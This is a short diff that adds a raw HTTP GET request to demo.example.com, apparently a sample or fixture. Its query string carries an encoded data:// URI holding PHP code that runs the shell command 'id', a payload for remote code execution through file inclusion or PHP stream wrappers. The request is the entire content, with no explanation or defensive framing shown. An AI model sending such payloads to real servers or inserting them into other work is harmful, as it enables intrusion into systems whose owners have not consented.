@@ -1,0 +1,4 @@
+GET /a?cmd=f%3Ddata://text/plain,\u003C%3Fphp%20system(\u0027id\u0027)\u003B%3F\u003E HTTP/1.1
+Host: demo.example.com
+Connection: close
+
